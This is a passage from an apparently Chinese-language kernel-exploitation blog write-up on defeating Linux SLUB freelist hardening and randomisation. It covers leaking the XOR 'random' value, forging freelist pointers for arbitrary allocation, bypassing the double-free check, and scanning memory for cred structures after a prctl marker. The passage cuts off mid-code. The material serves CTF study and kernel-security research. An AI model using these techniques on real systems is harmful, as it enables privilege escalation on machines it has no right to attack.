class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment">	 * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment">	 * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment">	 * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment">	 * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment">	 * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment">	 * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment">	 * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			swab((<span class="keyword">unsigned</span> <span class="keyword">long</span>)kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>ptr</code>即当前释放的chunk地址，ptr_addr为指向下一个free_chunk的地址，所以中间相当于有一个random值不知道。这个值在<code>linux/slub_def.h</code>中被定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>并且在<code>mm/slub.c</code>中的<code>kmem_cache_open</code>函数中被赋值</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kmem_cache_open</span><span class="params">(struct kmem_cache *s, <span class="keyword">slab_flags_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这里需要我们获得random的值，这个值保存在对于size的kmem_cache中，该结构体定义在<code>/linux/slub_def.h</code>中如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.17</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;	<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset;	<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> reserved;		<span class="comment">/* Reserved bytes at the end of slabs */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>并且不同size的kmem_cache对应的random不同。</p>
<p>在有DEBUG信息的内核中，我们尝试寻找0x10大小的kmem_cache比如我们寻找0x10大小的就需要在保存所有kmem_cache的全局变量结构kmalloc_caches中寻找，不过需要注意的是，好像很多时候不是按照顺序来排布的，如下图，我们就需要寻找kmalloc-16，但是这里它的索引为4，而不是2，不知道为什么。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png" alt="image-20220116152127879"></p>
<p>另外kmalloc_caches[0]并不是一个kmem_cache结构的，而是一个其他类型，暂时不知道用来干啥。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png" alt="image-20220116152404345"></p>
<p>那么回到正题，先寻找下random，这个就是0x10大小的kmem_cache中保存的random值了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png" alt="image-20220116152450367"></p>
<p>那么我们得到random值就可以算出下一个chunk在哪里了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png" alt="image-20220116152702584"></p>
<p>但是通常意义上如果开启了这个保护，我们是得不到堆地址的，最多得到保护之后的fd的值，没办法算出来random的值，但是由于是异或了当前堆地址ptr和堆地址+size(ptr_addr)，那么我们对size做文章，这样可以找出一些规律。</p>
<p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-15" >slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h5 id="🔺注：-1"   >
          <a href="#🔺注：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：-1" class="headerlink" title="🔺注："></a>🔺注：</h5>
      <p>在该内核下的同一个size的kmem_cache的random值不管启动多少次都是固定的，无论有没有开启KASLR。（至少我在本地测的时候是如此的）</p>

        <h6 id="未开启KASLR"   >
          <a href="#未开启KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#未开启KASLR" class="headerlink" title="未开启KASLR"></a>未开启KASLR</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png" alt="image-20220118124309671"></p>

        <h6 id="开启KASLR"   >
          <a href="#开启KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#开启KASLR" class="headerlink" title="开启KASLR"></a>开启KASLR</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png" alt="image-20220118124331545"></p>
<p>可以看到都是一致的。</p>
<p>但是放到题目中就不太确定了，就是将题目在本地运行测出来的random值和题目在远程运行测出来的random值是不是也是一样的呢，之前的西湖的easy_kernel题中貌似是一样的，但是我并没有实际测试，因为还没碰到..下回换个机器测试下。或者说和qemu还是环境cpu都有关系吗，期待大佬回答。</p>
<p>而且在后面的<strong>新版的HARDENED</strong>中也有提到，加入swab运算之后，貌似会对random值再做一个低2个字节的处理，这个是怎么处理的呢，还是有点不太懂。</p>

        <h5 id="①0x8为例"   >
          <a href="#①0x8为例" class="heading-link"><i class="fas fa-link"></i></a><a href="#①0x8为例" class="headerlink" title="①0x8为例"></a>①0x8为例</h5>
      <p>0x10对齐的堆块其fd均一样，取其fd直接异或0x8即可得到kmalloc-8的random值</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png" alt="image-20220116170303600"></p>
<p>原因如下，0x10对齐的堆块异或其值+0x8并不会造成进位，所以异或得到的值都是一样的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png" alt="image-20220116170714710"></p>

        <h5 id="②0x10，0x20，0x30等等"   >
          <a href="#②0x10，0x20，0x30等等" class="heading-link"><i class="fas fa-link"></i></a><a href="#②0x10，0x20，0x30等等" class="headerlink" title="②0x10，0x20，0x30等等"></a>②0x10，0x20，0x30等等</h5>
      <p>这种类型的其fd和random值一般差半个字节，大不了直接爆破，1/16的概率</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png" alt="image-20220116175038466"></p>
<p>并且观察可以发现，在0x10的情况下也会有重复的部分，同样的，该重复的部分异或0x10也会是random值</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png" alt="image-20220116175228263"></p>
<p>具体的还是自己摸索或者看一只狗师傅的：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-16" >slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h5 id="泄露random"   >
          <a href="#泄露random" class="heading-link"><i class="fas fa-link"></i></a><a href="#泄露random" class="headerlink" title="泄露random"></a>泄露random</h5>
      <p>以下泄露Random样例也是参照一只狗师傅的</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">2</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">Show(<span class="number">0</span>, &amp;FD1, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">1</span>, &amp;FD2, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">2</span>, &amp;FD3, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> random;</span><br><span class="line"><span class="keyword">if</span>(FD1==FD3)</span><br><span class="line">    random = FD1^<span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    random = FD2^<span class="number">0x100</span>;</span><br></pre></td></tr></table></div></figure>


        <h5 id="获得堆地址任意写"   >
          <a href="#获得堆地址任意写" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得堆地址任意写" class="headerlink" title="获得堆地址任意写"></a>获得堆地址任意写</h5>
      <p>但是获得堆地址不太好整，需要找到freelist的最后一个堆块last_chunk，然后其fd异或random即可得到该堆块的地址，获得堆块地址后，直接释放该堆块last_chunk，然后通过之前一个堆块pre_chunk溢出或者UAF，按照异或规则修改last_chunk的fd，就能实现任意申请了。</p>
<p>以8192大小为例，申请到最后一个chunk时释放，然后再申请就能申请回来了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png" alt="image-20220116181547997"></p>
<p>注意获取堆地址的时候，由于不同size的kmem_cache的最大freelist数量差异较大，size越大的其freelist链表个数越少，越容易申请到最后一个。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png" alt="image-20220116174436185"></p>

        <h4 id="2-HARDENED新版改动"   >
          <a href="#2-HARDENED新版改动" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-HARDENED新版改动" class="headerlink" title="(2)HARDENED新版改动"></a>(2)HARDENED新版改动</h4>
      
        <h5 id="kasan-reset-tag"   >
          <a href="#kasan-reset-tag" class="heading-link"><i class="fas fa-link"></i></a><a href="#kasan-reset-tag" class="headerlink" title="kasan_reset_tag"></a>kasan_reset_tag</h5>
      <p>从v5.0开始，加了一个新的东西</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr));</span><br></pre></td></tr></table></div></figure>

<p>这个不知道用来干啥的，有点蒙圈</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//linux/kasan.h</span><br><span class="line">static inline void *kasan_reset_tag(const void *addr)</span><br><span class="line">&#123;</span><br><span class="line">	return (void *)addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h5 id="swab"   >
          <a href="#swab" class="heading-link"><i class="fas fa-link"></i></a><a href="#swab" class="headerlink" title="swab"></a>swab</h5>
      <p>从v5.6.4开始，又加了一个运算</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swab(kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br></pre></td></tr></table></div></figure>

<p>本质上是大小端互换，比如</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> before = <span class="number">0xaabbccdd</span>;</span><br><span class="line"><span class="keyword">int</span> after = swab(before);</span><br><span class="line">after == <span class="number">0xddccbbaa</span>;</span><br></pre></td></tr></table></div></figure>

<p>这个直接解，参照哪个师傅的来着，忘记了…..</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __u64 u_int64_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swab64(x) ((__u64)((((__u64)(x) &amp; (__u64)0x00000000000000ffULL) &lt;&lt; 56) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000000000ff00ULL) &lt;&lt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000000000ff0000ULL) &lt;&lt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00000000ff000000ULL) &lt;&lt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000ff00000000ULL) &gt;&gt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000ff0000000000ULL) &gt;&gt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00ff000000000000ULL) &gt;&gt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0xff00000000000000ULL) &gt;&gt; 56)))</span></span><br></pre></td></tr></table></div></figure>

<p>然后又不知道从哪个版本开始，FD的存放位置发生改变，放在了chunk_addr+(size/2)的位置上，以0x80大小的chunk为例子(反正v5.0没有，v5.7有)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png" alt="image-20220117105059115"></p>
<p>此外计算方式也有点变化，ptr_addr不再是当前chunk的地址，而是FD的地址，同时还是会与上面的运算做一个简单的合并:</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr) ^ next_chunk_addr</span><br></pre></td></tr></table></div></figure>

<p>所以当我们本地把random值测出来之后，再依据freelist的最后一个直接改next_addr然后套入上述公式，获得FD值，将FD值写入即可完成上述任意堆块申请。（但是远程还没有试过，想来依据最近的easy_kernel中测出来的情况应该是random值也是不变的）</p>
<p>同样的当位于freelist的最后一个chunk时，next_chunk_addr = 0，上述公式就变成如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr)</span><br></pre></td></tr></table></div></figure>

<p>进而可以测出FD_addr，得到chunk的地址。当然，前提是建立在远程的random值不会发生改变。</p>
<p>如果远程的random值会发生改变的话，那么直接将当前FD_value异或需要劫持的fake_chunk_addr，那么一直将freelist申请完，之后再接着申请就能得到fake_chunk_addr。这种情况我们可以借助连续的两个FD_value中间4个字节是否发生改变来进行判断，如果改变了，那么代表freelist即将结束，这时候就可以进行修改了。不过修改之后，该size的<code>kmem_cache</code>的freelist链表就会损坏，要么重新修复，要么就申请其他size的<code>kmem_cache</code>。</p>
<p>但是还有一个问题就是，如果开了下面的<code>RANDOM</code>保护，那么我们测出来的random值其实就不一定准确了，因为freelist中的chunk地址不是连续的，我们用连续的地址来测势必导致测出来的random值的低2个字节不同，这时候就需要申请到freelist的最后一个chunk，取得其FD值的低2个字节和我们之前测出来的random一合并就是最终的random值了。不过这个怎么判断是freelist的最后一个chunk也有点问题…</p>

        <h5 id="double-free"   >
          <a href="#double-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h5>
      <p>在开启了HARDENED这种情况下，对于FD指针会添加一个检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mm/slub.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object, <span class="keyword">void</span> *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freeptr_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="keyword">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>检测double_free，其实就相当于是fastbin中的double_free检测，检测freelist中的第一个和即将放进入freelist中的chunk是否相等。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png" alt="image-20220308235157003"></p>
<p>所以同理可得，也可以说如下，在中间加入一个chunk的free即可绕过</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free chunk1</span><br><span class="line">free chunk2</span><br><span class="line">free chunk1</span><br></pre></td></tr></table></div></figure>

<p>但是在内核环境下，啥时候都可能碰到申请chunk，所以有时候可能再申请的时候不能成功申请到chunk1-&gt;chunk2-&gt;chunk1的顺序</p>
<p>这时候如果最好还是绑定到一个CPU上</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 绑定到一个cpu上</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cpu_mask = <span class="number">0x01</span>;</span><br><span class="line">sched_setaffinity(<span class="number">0</span>, <span class="number">1</span>, &amp;cpu_mask);</span><br></pre></td></tr></table></div></figure>




        <h4 id="3-RANDOM保护"   >
          <a href="#3-RANDOM保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-RANDOM保护" class="headerlink" title="(3)RANDOM保护"></a>(3)RANDOM保护</h4>
      <p>在v4.7及之后存在，编译内核时加入<code>CONFIG_SLAB_FREELIST_RANDOM=y</code>选项</p>
<p>这个情况下每次更新freelist的时候，会打乱freelist中空闲的chunk，造成无法简单申请到指定的chunk，不过我们可以修改FD之后，多次申请，也可以申请到修改之后的chunk。</p>
<p>也是参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="借助prctl函数寻找cred地址"   >
          <a href="#借助prctl函数寻找cred地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助prctl函数寻找cred地址" class="headerlink" title="借助prctl函数寻找cred地址"></a>借助prctl函数寻找cred地址</h3>
      <p>🔺注：需要存在任意读</p>
<p>prctl函数的PR_SET_NAME功能可以设置task_struct结构体中的comm[TASK_COMM_LEN]成员。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">&quot;tryToFindPIG007&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME,target);</span><br></pre></td></tr></table></div></figure>

<p>然后内存搜索定位</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//search target chr</span></span><br><span class="line"><span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any memory&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">    arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">    result=memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (result)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;result:%p\n&quot;</span>,result);</span><br><span class="line">        cred= * (<span class="keyword">size_t</span> *)(result<span class="number">-0x8</span>);</span><br><span class="line">        real_cred= *(<span class="keyword">size_t</span> *)(result<span class="number">-0x10</span>);</span><br><span class="line">        <span class="keyword">if</span> ((cred||<span class="number">0xff00000000000000</span>) 